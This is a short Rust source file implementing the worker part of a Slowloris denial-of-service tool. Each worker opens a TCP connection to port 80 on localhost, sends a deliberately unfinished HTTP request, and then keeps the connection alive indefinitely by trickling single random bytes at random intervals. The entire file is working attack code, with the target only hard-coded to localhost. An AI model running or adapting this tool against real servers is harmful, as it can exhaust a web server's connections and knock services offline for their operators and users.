use rand::rngs::SmallRng;
use rand::{FromEntropy, Rng};
use std::io::{Error, Write};
use std::net::TcpStream;
use std::thread;
use std::time::Duration;

pub struct Worker {
    id: u8,
    sleep_bounds: (u8, u8),
    stream: TcpStream,
}

impl Worker {
    pub fn new(id: u8, sleep_bounds: (u8, u8)) -> Result<Worker, Error> {
        let mut stream = TcpStream::connect("127.0.0.1:80")?;
        stream.write_all("GET / HTTP/1.1\r\nUser-Agent: slowloris\r\n".as_bytes())?;

        Ok(Worker {
            id,
            sleep_bounds,
            stream,
        })
    }

    pub fn start(&mut self) {
        let mut rng = SmallRng::from_entropy();

        loop {
            thread::sleep(Duration::from_secs(rng.gen_range(self.sleep_bounds.0, self.sleep_bounds.1) as u64));
            match &self.stream.write_all(&rng.gen::<[u8; 1]>()) {
                Ok(_) => println!("[slowloris_{:02}] Update sent.", self.id),
                Err(_) => println!("[slowloris_{:02}] Update failed.", self.id),
            }
        }
    }
}
